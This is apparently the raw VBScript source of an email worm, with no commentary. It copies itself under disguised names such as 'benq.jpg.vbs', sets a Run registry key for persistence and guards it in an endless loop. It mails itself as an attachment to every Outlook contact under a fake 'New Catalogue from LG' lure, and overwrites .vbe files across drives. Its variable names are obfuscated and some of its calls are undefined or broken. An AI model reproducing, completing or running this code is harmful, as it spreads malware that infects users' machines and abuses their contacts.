On Error Resume Next
Set shellobject = CreateObject("WScript.Shell")
shellobject.regwrite "HKCU\software\Fagor\"
Set filesystem= Createobject("scripting.filesystemobject")
filesystem.copyfile wscript.scriptfullname,filesystem.GetSpecialFolder(0)&"\benq.jpg.vbs"
filesystem.copyfile wscript.scriptfullname,filesystem.GetSpecialFolder(0)&"\master.vbs"
filesystem.copyfile wscript.scriptfullname,filesystem.GetSpecialFolder(0)&"\tenerife.htm"
if shellobject.regread ("HKCU\software\Fagor\mailed") <> "1" then
mail_worm()
end if
On Error Resume Next
Set FPP8339G = createobject("scripting.filesystemobject")
filesystem.copyfile wscript.scriptfullname,filesystem.GetSpecialFolder(0)&"\fotostenerife.vbs"
TR0V7P43 = FPP8339G.getspecialfolder(2)
H26LTAS1 = TR0V7P43 & "\Cookie.html.vbs"
Set NG22K1I5 = createobject("wscript.shell")
NG22K1I5.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\spoolsv", "Welcome.exe " & H26LTAS1 & " %"
FPP8339G.copyfile wscript.scriptfullname, H26LTAS1
N63E218B
If NG22K1I5.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Fagor\HO2IT156") <> 1 then
OE6957R5
U6634K0I
Set I74M4C84= FPP8339G.opentextfile(wscript.scriptfullname)
A7RMPV99 = I74M4C84.readall
I74M4C84.close
Do
if not(FPP8339G.fileexists(wscript.scriptfullname)) then
set RR2SAAMV= FPP8339G.createtextfile(wscript.scriptfullname)
RR2SAAMV.write A7RMPV99
RR2SAAMV.close
end if
O17KB824 = NG22K1I5.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\spoolsv")
If O17KB824 <> "wscript.exe " & H26LTAS1 & " %" then
NG22K1I5.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\spoolsv", "wscript.exe " & H26LTAS1 & " %"
end if
O17KB824= ""
loop
Function OE6957R5()
Set KON8P6AS = CreateObject("Outlook.Application")
If KON8P6AS = "Outlook" Then
Set IK4PRPM0 = KON8P6AS.GetNameSpace("MAPI")
Set L3G47755 = IK4PRPM0.AddressLists
For Each J4M14NM6 In L3G47755
If J4M14NM6.AddressEntries.Count <> 0 Then
MJ462NHG = J4M14NM6.AddressEntries.Count
For R6NRT3PG = 1 To MJ462NHG
Set VFI38L76 = KON8P6AS.CreateItem(0)
Set EQVV6745 = J4M14NM6.AddressEntries(R6NRT3PG)
VFI38L76.To = EQVV6745.Address
VFI38L76.Subject = "Important!!"
VFI38L76.Body = "ReadMe. New Catalogue from LG"
execute "set O8QK5P32 =VFI38L76." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
U7ID22B1 = H26LTAS1
VFI38L76.DeleteAfterSubmit = True
O8QK5P32.Add U7ID22B1
If VFI38L76.To <> "" Then
VFI38L76.Send
End If
Next
End If
Next
End If
End function
Function OIK388ET()
On Error Resume Next
Set VEIPP833 = FPP8339G.Drives
For Each QTKMGC32 In VEIPP833
HI5G22K1 = QTKMGC32 & " \ "
Call I61R0V7P(HI5G22K1)
Next
End Function
Function I61R0V7P(A2L26LTA)
S9563E21 = A2L26LTA
Set QEEO2IT1 = FPP8339G.GetFolder(S9563E21)
Set S41E6957 = QEEO2IT1.Files
For Each R2U74M4C In S41E6957
If IsVbs Then
If FPP8339G.GetExtensionName(R2U74M4C.path) = "vbe" Then
FPP8339G.CopyFile wscript.scriptfullname,R2U74M4C.path,true 
End if
Set UIO7RMPV = QEEO2IT1.Subfolders
For Each D73R2SAA In UIO7RMPV
Call (D73R2SAA.path)
Next
End if
next
end function
end if

